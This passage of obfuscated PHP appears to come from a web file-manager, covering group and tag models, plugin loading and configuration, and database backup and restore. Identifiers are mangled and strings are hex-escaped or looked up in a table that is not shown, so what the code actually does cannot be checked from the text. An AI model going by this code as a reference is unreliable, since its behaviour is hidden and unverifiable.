$»¤÷ÜşÆ = array($…Ì‘‹º“ => $¤º¡¤[$àüê±¬[2059]]); Model($àüê±¬[598])->userGroupAdd($¾À•Ç±ö, $»¤÷ÜşÆ); } Model($àüê±¬[598])->userGroupRemove($¾À•Ç±ö, $ª€€¨‡Ä); } $œÖ½Ó†Å = array($àüê±¬[190] => 2, $àüê±¬[192] => 0, $àüê±¬[485] => 1, $àüê±¬[569] => array($àüê±¬[7], array($ª€€¨‡Ä, $…Ì‘‹º“))); $şÏá‹Ôø = Model($àüê±¬[879])->where($œÖ½Ó†Å)->field($àüê±¬[2060])->select(); $şÏá‹Ôø = array_to_keyvalue($şÏá‹Ôø, $àüê±¬[569], $àüê±¬[193]); $¶…Àøû¨ = !empty($şÏá‹Ôø[$ª€€¨‡Ä]) ? $şÏá‹Ôø[$ª€€¨‡Ä] : !1; if ($¶…Àøû¨) { if (!$şÏá‹Ôø[$…Ì‘‹º“]) { $şÏá‹Ôø[$…Ì‘‹º“] = Model($àüê±¬[879])->groupRootAdd($…Ì‘‹º“); } $ğ«‚š§â = $şÏá‹Ôø[$…Ì‘‹º“]; $œÖ½Ó†Å = array($àüê±¬[192] => $¶…Àøû¨); $şÏá‹Ôø = Model($àüê±¬[879])->where($œÖ½Ó†Å)->field($àüê±¬[2061])->select(); if (!$şÏá‹Ôø) { $şÏá‹Ôø = array(); } Model($àüê±¬[879])->moveClearAuth = !1; foreach ($şÏá‹Ôø as $ƒ“¾µ„) { $š¼Ğª¥‰ = $ƒ“¾µ„[$àüê±¬[485]] == $àüê±¬[91] ? REPEAT_RENAME_FOLDER : REPEAT_RENAME; Model($àüê±¬[879])->move($ƒ“¾µ„[$àüê±¬[193]], $ğ«‚š§â, $š¼Ğª¥‰); } Model($àüê±¬[879])->moveClearAuth = !0; $œÖ½Ó†Å = array($àüê±¬[190] => 2, $àüê±¬[569] => $ª€€¨‡Ä); $¶õå¡¯Û = array($àüê±¬[569] => $…Ì‘‹º“); Model($àüê±¬[2062])->where($œÖ½Ó†Å)->save($¶õå¡¯Û); Model($àüê±¬[2063])->where($œÖ½Ó†Å)->save($¶õå¡¯Û); } $this->_changeChildLevel($“üãÊæ‘[$ª€€¨‡Ä], $“üãÊæ‘[$…Ì‘‹º“], !0); $this->where(array($àüê±¬[192] => $ª€€¨‡Ä))->save(array($àüê±¬[192] => $…Ì‘‹º“)); $this->_clearChildrenCache($“üãÊæ‘[$…Ì‘‹º“]); return !0; } } class GroupTagModel extends ModelBase { protected $tableName = "\x75\x73\x65\x72\x5f\x66\x61\166"; protected function cacheFunctionAlias($®Öì›®ø) { $©­Â‡åÊ =& $_SERVER[‹è™Ü¸Ñ]; return array($©­Â‡åÊ[2064] => array($®Öì›®ø[0], $©­Â‡åÊ[2065]), $©­Â‡åÊ[2066] => array($®Öì›®ø[0], $©­Â‡åÊ[2067])); } protected function get($ÅÄãí®˜) { $ºüŞ³€± =& $_SERVER[‹è™Ü¸Ñ]; $éæø´Ñâ = Model($ºüŞ³€±[585])->metaGet($ÅÄãí®˜, $ºüŞ³€±[2068]); $²£ê¯ÎŠ = json_decode($éæø´Ñâ, !0); return $²£ê¯ÎŠ ? $²£ê¯ÎŠ : array($ºüŞ³€±[2069] => $ºüŞ³€±[91], $ºüŞ³€±[445] => array()); } protected function set($Ÿù¹‚÷Û, $”ìº›Ü) { $¢¬…›‹× =& $_SERVER[‹è™Ü¸Ñ]; $”ìº›Ü = $”ìº›Ü ? $”ìº›Ü : array($¢¬…›‹×[2069] => $¢¬…›‹×[91], $¢¬…›‹×[445] => array()); return Model($¢¬…›‹×[585])->metaSet($Ÿù¹‚÷Û, $¢¬…›‹×[2068], json_encode($”ìº›Ü)); } protected function getByTagID($©©˜¸Ç¹, $ÅãØâŸ) { $®”ì’Æ =& $_SERVER[‹è™Ü¸Ñ]; if (!$©©˜¸Ç¹ || !$ÅãØâŸ) { return !1; } if (!Model($®”ì’Æ[585])->getInfoSimple($©©˜¸Ç¹)) { return !1; } $€©“ìÆµ = $this->get($©©˜¸Ç¹); if (!$€©“ìÆµ || !isset($€©“ìÆµ[$®”ì’Æ[445]])) { return !1; } $çïÌÈ†ê = array_find_by_field($€©“ìÆµ[$®”ì’Æ[445]], $®”ì’Æ[475], $ÅãØâŸ); return is_array($çïÌÈ†ê) ? $çïÌÈ†ê : !1; } public function listSource($™°Ë™Ê¥, $÷ ‰şïØ) { $—œÙ¶› =& $_SERVER[‹è™Ü¸Ñ]; if ($÷ ‰şïØ && !is_array($÷ ‰şïØ)) { $÷ ‰şïØ = array($÷ ‰şïØ); } $É²€ÜñÄ = $this->listData($™°Ë™Ê¥); $ÛÁßãÊÜ = array(); foreach ($É²€ÜñÄ as $›‚æë”) { $·ÚØ‚ß = $›‚æë”[$—œÙ¶›[87]]; if (!$·ÚØ‚ß) { continue; } if (!isset($ÛÁßãÊÜ[$·ÚØ‚ß])) { $ÛÁßãÊÜ[$·ÚØ‚ß] = array(); } $ÛÁßãÊÜ[$·ÚØ‚ß][] = $›‚æë”[$—œÙ¶›[500]]; } $´Û¿¬¶’ = array(); foreach ($ÛÁßãÊÜ as $Ë€³úÕÌ => $‰—öø) { $Ó”êçÉü = !0; if (!$÷ ‰şïØ) { $´Û¿¬¶’[] = $Ë€³úÕÌ; continue; } foreach ($÷ ‰şïØ as $Çè˜•œĞ) { if (!in_array($Çè˜•œĞ, $‰—öø)) { $Ó”êçÉü = !1; break; } } if ($Ó”êçÉü) { $´Û¿¬¶’[] = $Ë€³úÕÌ; } } if (!$´Û¿¬¶’) { return array(); } $†¬‘±Ÿ = array($—œÙ¶›[491] => array($—œÙ¶›[492], $´Û¿¬¶’), $—œÙ¶›[569] => $™°Ë™Ê¥, $—œÙ¶›[190] => SourceModel::TYPE_GROUP); $ÈŞëØâÓ = Model($—œÙ¶›[1398])->listSource($†¬‘±Ÿ); if (!$ÈŞëØâÓ || count($´Û¿¬¶’) == $ÈŞëØâÓ[$—œÙ¶›[442]][$—œÙ¶›[443]]) { return $ÈŞëØâÓ; } $İû­œÁ = array(); $”–¹Í€Ò = array_to_keyvalue($ÈŞëØâÓ[$—œÙ¶›[85]], $—œÙ¶›[12], $—œÙ¶›[193]); $Àº•°İ = array_to_keyvalue($ÈŞëØâÓ[$—œÙ¶›[86]], $—œÙ¶›[12], $—œÙ¶›[193]); $‡«òáÖÈ = array_merge($Àº•°İ, $”–¹Í€Ò); foreach ($´Û¿¬¶’ as $·ÚØ‚ß) { if (!in_array($·ÚØ‚ß, $‡«òáÖÈ)) { $İû­œÁ[] = $·ÚØ‚ß; } } if ($İû­œÁ) { $this->removeBySource($™°Ë™Ê¥, $İû­œÁ); } return $ÈŞëØâÓ; } protected function listData($ï¢ŠÑ¡ü) { $ö§äÓì‹ =& $_SERVER[‹è™Ü¸Ñ]; $‡˜ªÎ×î = array($ö§äÓì‹[1743] => 0, $ö§äÓì‹[557] => array($ö§äÓì‹[2070], 0), $ö§äÓì‹[496] => $ö§äÓì‹[2071] . $ï¢ŠÑ¡ü); $ƒœëÔûŒ = $ö§äÓì‹[2072]; $ú‡ÃĞ‡Ï = $this->field($ƒœëÔûŒ)->where($‡˜ªÎ×î)->order($ö§äÓì‹[2073])->select(); return $ú‡ÃĞ‡Ï ? $ú‡ÃĞ‡Ï : array(); } protected function addToTag($›°Âî‘¢, $™öã°, $›î× Ã) { $¦áö×·˜ =& $_SERVER[‹è™Ü¸Ñ]; if (!$this->getByTagID($›°Âî‘¢, $›î× Ã) || !$™öã°) { return !1; } if (!Model($¦áö×·˜[879])->pathInfo($™öã°)) { return !1; } $ò£¬úÏŠ = array($¦áö×·˜[1743] => 0, $¦áö×·˜[557] => $›î× Ã, $¦áö×·˜[495] => $™öã°, $¦áö×·˜[496] => $¦áö×·˜[2074] . $›°Âî‘¢, $¦áö×·˜[494] => $¦áö×·˜[12], $¦áö×·˜[1955] => 0); if ($this->where($ò£¬úÏŠ)->find()) { return !1; } return $this->add($ò£¬úÏŠ); } protected function removeFromTag($üÕÌìØé, $„à±Ò«†, $üéÂÄï‰) { $¥½İ¶ =& $_SERVER[‹è™Ü¸Ñ]; if (!$this->getByTagID($üÕÌìØé, $üéÂÄï‰) || !$„à±Ò«†) { return !1; } if (is_array($„à±Ò«†)) { $„à±Ò«† = array($¥½İ¶[7], $„à±Ò«†); } $‰öÖÄ = array($¥½İ¶[1743] => 0, $¥½İ¶[557] => $üéÂÄï‰, $¥½İ¶[496] => $¥½İ¶[2074] . $üÕÌìØé, $¥½İ¶[495] => $„à±Ò«†); return $this->where($‰öÖÄ)->delete(); } protected function removeByTag($šç›÷ª—, $ëç¾ËëŒ) { $•ÊÚ¤¤» =& $_SERVER[‹è™Ü¸Ñ]; if (!$this->getByTagID($šç›÷ª—, $ëç¾ËëŒ)) { return !1; } $Ş¥÷Ì = array($•ÊÚ¤¤»[1743] => 0, $•ÊÚ¤¤»[557] => $ëç¾ËëŒ, $•ÊÚ¤¤»[496] => $•ÊÚ¤¤»[2074] . $šç›÷ª—); return $this->where($Ş¥÷Ì)->delete(); } protected function removeBySource($ÇÉşÅØ¦, $øÔ¾–¸) { $½ÕÑ±ÖÎ =& $_SERVER[‹è™Ü¸Ñ]; if (!$ÇÉşÅØ¦ || !$øÔ¾–¸) { return !1; } if (is_array($øÔ¾–¸)) { $øÔ¾–¸ = array($½ÕÑ±ÖÎ[7], $øÔ¾–¸); } $Ä›–‹¨ü = array($½ÕÑ±ÖÎ[1743] => 0, $½ÕÑ±ÖÎ[495] => $øÔ¾–¸, $½ÕÑ±ÖÎ[557] => array($½ÕÑ±ÖÎ[1072], 0), $½ÕÑ±ÖÎ[496] => $½ÕÑ±ÖÎ[2074] . $ÇÉşÅØ¦); return $this->where($Ä›–‹¨ü)->delete(); } } class PluginModel extends ModelBaseLight { public $optionType = "\x53\x79\x73\x74\145\x6d\x2e\x70\x6c\x75\x67\151\x6e\114\151\163\164"; public $field = array("\156\141\x6d\145", "\x73\x74\x61\164\165\163", "\162\145\x67\x69\145\163\164", "\143\157\x6e\x66\x69\x67"); public function loadList($ËŸ¹·Ã = false) { $ìâéîÅæ = array_to_keyvalue($this->listData(), $_SERVER[‹è™Ü¸Ñ][32]); if ($ËŸ¹·Ã) { return $ìâéîÅæ[$ËŸ¹·Ã]; } return $ìâéîÅæ; } public function init() { $ªÅ¼ş¨ß =& $_SERVER[‹è™Ü¸Ñ]; Hook::trigger($ªÅ¼ş¨ß[2075]); $òíİ†ğÏ = $this->loadPluginList(); foreach ($òíİ†ğÏ as $Ç´ßé©Ó => $Õµ›ÀäŠ) { $éÁæñì€ = $this->appAllow($Ç´ßé©Ó, $Õµ›ÀäŠ); if (!$éÁæñì€) { continue; } foreach ($Õµ›ÀäŠ[$ªÅ¼ş¨ß[2076]] as $í¨åú¾ñ => $İÒÎÇõÃ) { Hook::bind($í¨åú¾ñ, $İÒÎÇõÃ); } } Hook::trigger($ªÅ¼ş¨ß[2077]); Hook::trigger(ACTION); } public function appAllow($ºŠığÊ«, $Ñ‡¹ù½ó, $½–è·• = true) { $ø÷Ïœïı =& $_SERVER[‹è™Ü¸Ñ]; $ƒí¯ ‡é = PLUGIN_DIR . $ºŠığÊ« . $ø÷Ïœïı[2078]; if (!is_array($Ñ‡¹ù½ó) || !is_array($Ñ‡¹ù½ó[$ø÷Ïœïı[2076]]) || $Ñ‡¹ù½ó[$ø÷Ïœïı[805]] != 1 || !is_file($ƒí¯ ‡é)) { return !1; } if (KodUser::isRoot()) { if ($GLOBALS[$ø÷Ïœïı[6]][$ø÷Ïœïı[2079]] || !$GLOBALS[$ø÷Ïœïı[6]][$ø÷Ïœïı[2080]]) { return !0; } $Æ•­³…‹ = explode($ø÷Ïœïı[50], strtolower($GLOBALS[$ø÷Ïœïı[6]][$ø÷Ïœïı[2080]])); return in_array(strtolower($ºŠığÊ«), $Æ•­³…‹) ? !1 : !0; } if ($½–è·• && !Action($ø÷Ïœïı[2081])->checkAuth($ºŠığÊ«)) { return !1; } return !0; } public function unInstall($ûü­öÆ„) { $”™›äâ =& $_SERVER[‹è™Ü¸Ñ]; $Ñû“Ÿ”£ = $this->loadList($ûü­öÆ„); if (file_exists(PLUGIN_DIR . $ûü­öÆ„)) { Hook::apply($ûü­öÆ„ . $”™›äâ[2082]); } $this->remove($Ñû“Ÿ”£[$”™›äâ[475]]); } public function changeStatus($¦éöè„Ú, $ç³×ùçå) { $ìòÚ´±° =& $_SERVER[‹è™Ü¸Ñ]; $¡ä»‰‰ø = $this->loadList($¦éöè„Ú); if ($ç³×ùçå) { Hook::apply($¦éöè„Ú . $ìòÚ´±°[2083]); } $this->update($¡ä»‰‰ø[$ìòÚ´±°[475]], array($ìòÚ´±°[2084] => $ç³×ùçå)); } public function appRegist($ÆÉÁ‘…÷, $—Øºúåõ) { $è¢·¢é =& $_SERVER[‹è™Ü¸Ñ]; $±–ê¸ ± = $this->loadList($ÆÉÁ‘…÷); if ($±–ê¸ ±) { $this->update($±–ê¸ ±[$è¢·¢é[475]], array($è¢·¢é[2076] => $—Øºúåõ)); } else { $¢§ğ’şğ = array($è¢·¢é[32] => $ÆÉÁ‘…÷, $è¢·¢é[2076] => $—Øºúåõ, $è¢·¢é[805] => 0, $è¢·¢é[6] => $this->getConfigDefault($ÆÉÁ‘…÷)); $this->insert($¢§ğ’şğ); } } public function getConfigDefault($„ôÜò®È) { $ÁÊ¡Ä„» =& $_SERVER[‹è™Ü¸Ñ]; $è¾Ã»î¡ = array(); $ÎÇ”î£ = $this->getPackageJson($„ôÜò®È); if (!$ÎÇ”î£ && is_array($ÎÇ”î£[$ÁÊ¡Ä„»[2085]])) { return $è¾Ã»î¡; } foreach ($ÎÇ”î£[$ÁÊ¡Ä„»[2085]] as $æÓ·¬¼ => $®‰ôËÈ) { if (!isset($®‰ôËÈ[$ÁÊ¡Ä„»[450]]) || isset($è¾Ã»î¡[$æÓ·¬¼])) { continue; } $è¾Ã»î¡[$æÓ·¬¼] = $®‰ôËÈ[$ÁÊ¡Ä„»[450]]; } return $è¾Ã»î¡; } public function getPackageJson($×¶ÀúÃ¶) { return Hook::apply($×¶ÀúÃ¶ . $_SERVER[‹è™Ü¸Ñ][2086]); } public function getConfig($…«Åğ‰š, $£†ó¯±› = false) { $Áóßş—· =& $_SERVER[‹è™Ü¸Ñ]; $³—Ã¯Òà = array(); $íü±öô = $this->loadList($…«Åğ‰š); if ($íü±öô && is_array($íü±öô[$Áóßş—·[6]])) { $³—Ã¯Òà = $íü±öô[$Áóßş—·[6]]; } if (!$³—Ã¯Òà || $£†ó¯±›) { $³—Ã¯Òà = $this->getConfigDefault($…«Åğ‰š); } return $³—Ã¯Òà; } public function setConfig($˜Ö”„äã, $ùËÙ•Ëó = false) { $¦¬ş®Õ =& $_SERVER[‹è™Ü¸Ñ]; $÷à×²Çó = $this->loadList($˜Ö”„äã); if (!$÷à×²Çó) { return !1; } $‡ö‹Ğ¯Õ = $÷à×²Çó[$¦¬ş®Õ[6]]; if ($ùËÙ•Ëó == !1) { $‡ö‹Ğ¯Õ = array(); $ùËÙ•Ëó = $this->getConfigDefault($˜Ö”„äã); } foreach ($ùËÙ•Ëó as $ÊèæøÙ => $×©„–¾¿) { $‡ö‹Ğ¯Õ[$ÊèæøÙ] = is_string($×©„–¾¿) ? trim($×©„–¾¿) : $×©„–¾¿; } $this->update($÷à×²Çó[$¦¬ş®Õ[475]], array($¦¬ş®Õ[6] => $‡ö‹Ğ¯Õ)); } public function viewList() { $¸ÔîÆŸ =& $_SERVER[‹è™Ü¸Ñ]; $ÒãœÉ = $this->loadList(); $this->pluginScan($ÒãœÉ); $ÒãœÉ = $this->loadPluginList(); $¾¼„™ãË = array(); foreach ($ÒãœÉ as $ÌÊçšî  => $òŸ·Ã) { $üÈÑ… = $òŸ·Ã; unset($òŸ·Ã[$¸ÔîÆŸ[2076]], $òŸ·Ã[$¸ÔîÆŸ[6]]); $³‡æ½Åõ = PLUGIN_DIR . $òŸ·Ã[$¸ÔîÆŸ[32]] . $¸ÔîÆŸ[2078]; if (!is_file($³‡æ½Åõ)) { continue; } $®×ïüòû = Hook::apply($òŸ·Ã[$¸ÔîÆŸ[32]] . $¸ÔîÆŸ[2086]); if (!is_array($®×ïüòû)) { continue; } $¾¼„™ãË[$ÌÊçšî ] = array_merge($òŸ·Ã, $®×ïüòû); if ($üÈÑ…[$¸ÔîÆŸ[6]][$¸ÔîÆŸ[1664]] != $®×ïüòû[$¸ÔîÆŸ[1638]]) { Hook::apply($òŸ·Ã[$¸ÔîÆŸ[32]] . $¸ÔîÆŸ[2083]); $üÈÑ…[$¸ÔîÆŸ[6]][$¸ÔîÆŸ[1664]] = $®×ïüòû[$¸ÔîÆŸ[1638]]; $this->update($òŸ·Ã[$¸ÔîÆŸ[475]], array($¸ÔîÆŸ[6] => $üÈÑ…[$¸ÔîÆŸ[6]])); } } return $¾¼„™ãË; } private function loadPluginList() { $°óÒÜ±Ô =& $_SERVER[‹è™Ü¸Ñ]; $ƒÆà³— = $this->loadList(); if (strtolower(MOD) == $°óÒÜ±Ô[2087]) { return $ƒÆà³—; } $²ÄÌĞ·ò = Hook::trigger($°óÒÜ±Ô[2088], $ƒÆà³—); if ($ƒÆà³— && !$²ÄÌĞ·ò) { die; } return $²ÄÌĞ·ò ? $²ÄÌĞ·ò : $ƒÆà³—; } private function pluginScan($äÎÊ¡šà) { $¦‚Û“™ =& $_SERVER[‹è™Ü¸Ñ]; recursion_dir(PLUGIN_DIR, $Ù½¡—†‰, $†¨”„™, 0); foreach ($Ù½¡—†‰ as $İ é±›±) { $»”çş˜Í = get_path_this($İ é±›±); if (isset($äÎÊ¡šà[$»”çş˜Í]) || !file_exists($İ é±›± . $¦‚Û“™[2089]) || !file_exists($İ é±›± . $¦‚Û“™[2078])) { continue; } Hook::apply($»”çş˜Í . $¦‚Û“™[2083]); } } } goto e¿ÒºÏã‘; dÎ©ñ•–Ó×: class DbManage { function __construct($Š…²Æ‹¥ = array()) { $È¾ß©¦å =& $_SERVER[‹è™Ü¸Ñ]; if (empty($Š…²Æ‹¥)) { $Š…²Æ‹¥ = $GLOBALS[$È¾ß©¦å[6]][$È¾ß©¦å[21]]; } $this->database = $Š…²Æ‹¥; } public function model($‰ÖÉıµ• = '') { return new ModelBase($‰ÖÉıµ•, $_SERVER[‹è™Ü¸Ñ][12], $this->database); } public function db($²’¤ºÉ† = false) { $¸®ÒéâÒ =& $_SERVER[‹è™Ü¸Ñ]; $™€è¼ıñ = array_change_key_case($this->database); if ($this->dbType() == $¸®ÒéâÒ[13] || !$²’¤ºÉ†) { return $this->model()->db(); } $ÍŞî¦ÖÄ = $™€è¼ıñ[$¸®ÒéâÒ[1030]]; $™€è¼ıñ[$¸®ÒéâÒ[1030]] = $¸®ÒéâÒ[12]; if ($™€è¼ıñ[$¸®ÒéâÒ[1025]] == $¸®ÒéâÒ[1022]) { $Ğ‘Şé½æ = $™€è¼ıñ[$¸®ÒéâÒ[1031]]; $™€è¼ıñ[$¸®ÒéâÒ[1031]] = substr($Ğ‘Şé½æ, 0, strrpos($Ğ‘Şé½æ, $¸®ÒéâÒ[1117])); } $this->database = $™€è¼ıñ; $–ƒÅïÅ = $this->model()->db(); try { $Àæ¿ÜÂà = $–ƒÅïÅ->execute("\x73\150\x6f\167\x20\144\141\164\141\142\141\163\145\x73\40\x6c\x69\x6b\x65\x20\47{$ÍŞî¦ÖÄ}\47"); } catch (Exception $œ½İÈî“) { } if (!$Àæ¿ÜÂà) { $–ƒÅïÅ->execute("\x63\x72\x65\x61\x74\145\40\x64\141\x74\x61\x62\141\163\145\x20\140{$ÍŞî¦ÖÄ}\140"); } $™€è¼ıñ[$¸®ÒéâÒ[1030]] = $ÍŞî¦ÖÄ; if ($™€è¼ıñ[$¸®ÒéâÒ[1025]] == $¸®ÒéâÒ[1022]) { $™€è¼ıñ[$¸®ÒéâÒ[1031]] .= $¸®ÒéâÒ[1117] . $ÍŞî¦ÖÄ; } $this->database = $™€è¼ıñ; $–ƒÅïÅ->execute("\165\163\145\40\x60{$ÍŞî¦ÖÄ}\x60"); return $–ƒÅïÅ; } public function createTable($ºá·ê—, &$ŞŞÂÈ…Å) { $Ñûî¨» =& $_SERVER[‹è™Ü¸Ñ]; if (!IO::exist($ºá·ê—)) { ActionCall($Ñûî¨»[1118], !0, 0); show_json(LNG($Ñûî¨»[1119]), !1); } $ÑĞ´ª = $this->model()->db(); $ìÚ•Ê³Í = sqlSplit(IO::getContent($ºá·ê—)); foreach ($ìÚ•Ê³Í as $°°¼‡Ø¥) { $¼ÏÂ¹˜ = stripos($°°¼‡Ø¥, $Ñûî¨»[1120]) === 0; if ($¼ÏÂ¹˜) { $ŞŞÂÈ…Å->task[$Ñûî¨»[1121]] += 1; } $ÑĞ´ª->execute($°°¼‡Ø¥); if ($¼ÏÂ¹˜) { preg_match($Ñûî¨»[1122], $°°¼‡Ø¥, $µÒ²«·); $ŞŞÂÈ…Å->task[$Ñûî¨»[1123]] = $µÒ²«·[1]; $ŞŞÂÈ…Å->update(1); } } } public function insertTable($äøÍèó, &$»Öáã°®) { $©€¾˜íÎ =& $_SERVER[‹è™Ü¸Ñ]; $¼Î¼İ¹½ = $this->model()->db(); $ÑÎûüƒ = $ŒÈÓÙĞ ? array($ŒÈÓÙĞ) : $¼Î¼İ¹½->getTables(); foreach ($äøÍèó as $±„¨ÀÂ) { $ŒÈÓÙĞ = basename($±„¨ÀÂ, $©€¾˜íÎ[843]); if (!in_array($ŒÈÓÙĞ, $ÑÎûüƒ)) { continue; } $»Öáã°®->task[$©€¾˜íÎ[1123]] = $ŒÈÓÙĞ; if (get_filesize($±„¨ÀÂ) == 0) { continue; } $‘ĞÌ¦Ú = $this->sqlToDb($±„¨ÀÂ, $»Öáã°®); if (!$‘ĞÌ¦Ú) { ActionCall($©€¾˜íÎ[1118], !0, 0); show_json(LNG($©€¾˜íÎ[1124]) . "\x5b{$ŒÈÓÙĞ}\x5d", !1); } } } public function sqlFromDb($ÈÓèÖÀˆ, $É ¢İŞ, &$Úú÷õ´—, $·—²üˆÖ = '') { if ($Úú÷õ´—) { $Úú÷õ´—->task[$_SERVER[‹è™Ü¸Ñ][1123]] = $ÈÓèÖÀˆ; } $õ”«Ô×– = $this->model($ÈÓèÖÀˆ); $´Â¿áå¤ = 0; $¼Ïà×•ˆ = 0; $ÛÎÖÇ“È = 10000; $ˆæì¶‹ = fopen($É ¢İŞ, $_SERVER[‹è™Ü¸Ñ][1125]); $ÒÇæ¦– = $õ”«Ô×–->getPk(); $ã™™ÑàÙ = $õ”«Ô×–->getDbFields(); $æã¯¶¾° = $_SERVER[‹è™Ü¸Ñ][12]; if ($GLOBALS[$_SERVER[‹è™Ü¸Ñ][842]] && in_array($ÈÓèÖÀˆ, array($_SERVER[‹è™Ü¸Ñ][1126], $_SERVER[‹è™Ü¸Ñ][1127]))) { $æã¯¶¾° = $ÈÓèÖÀˆ; } do { $Ì—ûş Ë = array($ÒÇæ¦– => array($_SERVER[‹è™Ü¸Ñ][1072], $¼Ïà×•ˆ)); $ŞœìÌ›‹ = $õ”«Ô×–->where($Ì—ûş Ë)->field($ã™™ÑàÙ)->order($ÒÇæ¦– . $_SERVER[‹è™Ü¸Ñ][1128])->limit($ÛÎÖÇ“È)->select(); $ŞœìÌ›‹ = !empty($ŞœìÌ›‹) ? $ŞœìÌ›‹ : array(); if (!($Åì¬¦ = count($ŞœìÌ›‹))) { break; } $Û»‡×¤Ç = end($ŞœìÌ›‹); $¼Ïà×•ˆ = $Û»‡×¤Ç[$ÒÇæ¦–]; $ç¨©Şé = array(); foreach ($ŞœìÌ›‹ as $‰”Ÿ¦Ö±) { if ($æã¯¶¾°) { if ($ÈÓèÖÀˆ == $_SERVER[‹è™Ü¸Ñ][1126]) { if ($‰”Ÿ¦Ö±[$_SERVER[‹è™Ü¸Ñ][33]] == $_SERVER[‹è™Ü¸Ñ][1129]) { $ïÕåÃûˆ = json_decode($‰”Ÿ¦Ö±[$_SERVER[‹è™Ü¸Ñ][450]], !0); if ($ïÕåÃûˆ[$_SERVER[‹è™Ü¸Ñ][32]] == $GLOBALS[$_SERVER[‹è™Ü¸Ñ][842]] && $ïÕåÃûˆ[$_SERVER[‹è™Ü¸Ñ][805]] != 1) { continue; } } } else { if ($‰”Ÿ¦Ö±[$_SERVER[‹è™Ü¸Ñ][33]] == $_SERVER[‹è™Ü¸Ñ][1130] && $‰”Ÿ¦Ö±[$_SERVER[‹è™Ü¸Ñ][97]] == $_SERVER[‹è™Ü¸Ñ][837]) { continue; } } } if ($·—²üˆÖ) { $‰”Ÿ¦Ö±[$_SERVER[‹è™Ü¸Ñ][87]] = "\x7b\151\x6f\x3a{$·—²üˆÖ}\175" . substr($‰”Ÿ¦Ö±[$_SERVER[‹è™Ü¸Ñ][87]], strlen("\x7b\x69\x6f\x3a{$‰”Ÿ¦Ö±[$_SERVER[‹è™Ü¸Ñ][872]]}\x7d")); $‰”Ÿ¦Ö±[$_SERVER[‹è™Ü¸Ñ][872]] = $·—²üˆÖ; } $ç¨©Şé[] = $_SERVER[‹è™Ü¸Ñ][1131] . $this->sqlEncode($‰”Ÿ¦Ö±) . $_SERVER[‹è™Ü¸Ñ][1132]; } $ÛÊÊè™î = "\111\x4e\123\x45\122\x54\x20\x49\116\x54\x4f\40\x60{$ÈÓèÖÀˆ}\140\x20\50\140" . implode($_SERVER[‹è™Ü¸Ñ][1133], $ã™™ÑàÙ) . $_SERVER[‹è™Ü¸Ñ][1134]; fwrite($ˆæì¶‹, $ÛÊÊè™î . implode($_SERVER[‹è™Ü¸Ñ][1135], $ç¨©Şé) . $_SERVER[‹è™Ü¸Ñ][74] . PHP_EOL); $´Â¿áå¤ += $Åì¬¦; if ($Úú÷õ´—) { $Úú÷õ´—->update($Åì¬¦); } } while ($ÛÎÖÇ“È == $Åì¬¦); fclose($ˆæì¶‹); return $´Â¿áå¤; } public function sqlToDb($ï©²Ì, &$ÄšÑÒ€©) { $ÛÈŒèŸı =& $_SERVER[‹è™Ü¸Ñ]; $âÚØÂƒ = $this->model()->db(); $ Ê’êĞÒ = @fopen($ï©²Ì, $ÛÈŒèŸı[1136]); if (!$ Ê’êĞÒ) { return !1; } $£ÁåÓÌŒ = 0; $¹üçƒÍÊ = $ÛÈŒèŸı[12]; $«‹³„áÎ = array(); $ø‘ØÂ™ï = $this->dbType(); $Ö‘ˆ˜À® = $ø‘ØÂ™ï == $ÛÈŒèŸı[13] ? 500 : 2000; $¿¯èÏµ© = basename($ï©²Ì, $ÛÈŒèŸı[843]); $ÂÕÛ×ü— = 0; $¾ÏÌéÂ = 4194304; while (!feof($ Ê’êĞÒ)) { $ìÖÄ¨ªÛ = trim(fgets($ Ê’êĞÒ)); if (!$ìÖÄ¨ªÛ) { continue; } $ Ã´Õ˜ = $this->sqlDecode($ìÖÄ¨ªÛ, $ø‘ØÂ™ï, $¿¯èÏµ©); if (stripos($ Ã´Õ˜, $ÛÈŒèŸı[431]) === 0) { if (!$¹üçƒÍÊ) { $¹üçƒÍÊ = $ Ã´Õ˜ . $ÛÈŒèŸı[53]; } continue; } if ($ÄšÑÒ€©) { $ÄšÑÒ€©->task[$ÛÈŒèŸı[1121]] += 1; } $£ÁåÓÌŒ++; $«‹³„áÎ[] = rtrim(rtrim(trim($ Ã´Õ˜), $ÛÈŒèŸı[50]), $ÛÈŒèŸı[74]); $¾à§­íŞ = null; $Ô³Ø¦ƒã = strlen($ Ã´Õ˜); $ÂÕÛ×ü— += $Ô³Ø¦ƒã; $«ü¤æ = strlen($¹üçƒÍÊ) + $ÂÕÛ×ü— + (count($«‹³„áÎ) - 1); if ($«ü¤æ >= $¾ÏÌéÂ) { $¾à§­íŞ = array_pop($«‹³„áÎ); if ($£ÁåÓÌŒ > 1) { $£ÁåÓÌŒ--; } } if ($£ÁåÓÌŒ >= $Ö‘ˆ˜À® || $¾à§­íŞ) { $ Ã´Õ˜ = $¹üçƒÍÊ . implode($ÛÈŒèŸı[50], $«‹³„áÎ); if (!$âÚØÂƒ->execute($ Ã´Õ˜)) { return !1; } if ($ÄšÑÒ€©) { $ÄšÑÒ€©->update($£ÁåÓÌŒ); } $«‹³„áÎ = array(); $£ÁåÓÌŒ = 0; $ÂÕÛ×ü— = 0; if ($¾à§­íŞ) { $«‹³„áÎ = array($¾à§­íŞ); $£ÁåÓÌŒ = 1; $ÂÕÛ×ü— = $Ô³Ø¦ƒã; } } } fclose($ Ê’êĞÒ); if (!empty($«‹³„áÎ)) { $ Ã´Õ˜ = $¹üçƒÍÊ . implode($ÛÈŒèŸı[50], $«‹³„áÎ); if (!$âÚØÂƒ->execute($ Ã´Õ˜)) { return !1; } if ($ÄšÑÒ€©) { $ÄšÑÒ€©->update($£ÁåÓÌŒ); } } return !0; } public function dropTable($œÙßö»½ = null) { $úàñ£Û² = $this->model()->db(); $ƒœÌ—ˆ = $œÙßö»½ ? array($œÙßö»½) : $úàñ£Û²->getTables(); if (!$ƒœÌ—ˆ) { return; } foreach ($ƒœÌ—ˆ as $œÙßö»½) { if ($œÙßö»½) { $œÙßö»½ = strtolower($œÙßö»½); } else { continue; } $úàñ£Û²->execute("\x64\162\x6f\x70\40\x74\x61\x62\x6c\x65\x20\x69\x66\x20\x65\170\151\x73\164\x73\40\x60{$œÙßö»½}\x60"); } } private function sqlEncode($›«•¬©Ã) { $‰ğËåø  =& $_SERVER[‹è™Ü¸Ñ]; $¼õ§‰¦ = array(); foreach ($›«•¬©Ã as $Ì€¡œ£) { if (is_array($Ì€¡œ£)) { $Ì€¡œ£ = json_encode_force($Ì€¡œ£); } $Ì€¡œ£ = addslashes($Ì€¡œ£); $Ì€¡œ£ = 